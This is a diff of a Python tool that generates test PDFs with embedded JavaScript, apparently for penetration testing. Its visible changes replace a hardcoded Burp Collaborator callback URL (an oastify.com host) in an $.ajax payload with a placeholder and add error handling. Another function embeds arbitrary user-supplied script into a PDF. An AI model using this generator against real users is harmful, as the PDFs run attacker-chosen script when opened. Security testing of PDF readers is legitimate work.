@@ -5,7 +5,6 @@ import io
 import bz2
 import base64
 
-
 def create_malpdf1(filename):
     with open(filename, "w") as file:
         file.write('''%PDF-1.7
@@ -34,7 +33,7 @@ def create_malpdf3(filename):
             app.alert(1);
             $.ajax({
                 type: "GET",
-                url: "http://k3omu560zcqzxuva9xjdihzpogu7iy6n.oastify.com",
+                url: "", //TODO: BURP COLLAB URL 
                 success: function(data){
                     app.alert("OK");
                 },
@@ -54,15 +53,18 @@ def create_malpdf_input(filename, cin):
         <</S /JavaScript /JS ('''+cin+'''
         )>> trailer <</Root 1 0 R>>''')
 
+#TODO: args options, add burp collab url option, add install req
 if __name__ == "__main__":
-  print("[+] Creating PDF files..")
-  option = int(input("Input option 1 or 2: "))
-  if option == 1: 
-    create_malpdf1("test.pdf")
-    create_malpdf2("test2.pdf")
-    create_malpdf3("test3.pdf")
-  elif option == 2:
-    cin = input("Input script: ")
-    create_malpdf_input("test_input.pdf", cin)
-
-print("[-] Done!")
+    print("[+] Creating PDF files..")
+    try: 
+        option = int(input("Input option 1 or 2: "))
+        if option == 1: 
+            create_malpdf1("test.pdf")
+            create_malpdf2("test2.pdf")
+            create_malpdf3("test3.pdf")
+        elif option == 2:
+            cin = input("Input script: ")
+            create_malpdf_input("test_input.pdf", cin)
+        print("[-] Done!")
+    except: 
+        print("Failed to create, must enter integer value 1 or 2...")
